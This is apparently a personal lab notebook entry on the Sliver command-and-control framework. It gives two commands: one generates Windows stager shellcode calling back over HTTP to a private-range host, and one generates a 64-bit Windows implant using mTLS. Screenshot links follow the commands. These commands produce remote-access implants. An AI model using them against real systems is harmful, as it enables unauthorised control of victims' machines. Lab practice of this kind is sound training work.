# Sliver Payloads

##### Generate Shellcode
```
generate stager --lhost 192.168.56.11 --lport 8082 --protocol http --save /home/kali/Desktop/sliver/win-stager-shellcode
```
![](../../../../zzAttachments/Pasted%20image%2020250903161811.png)

##### Generate Payloads
```
generate --os windows --arch 64bit --mtls 192.168.56.230 --save /home/kali/Desktop/sliver/
```
![](../../zzAttachments/Pasted%20image%2020250903162447.png)
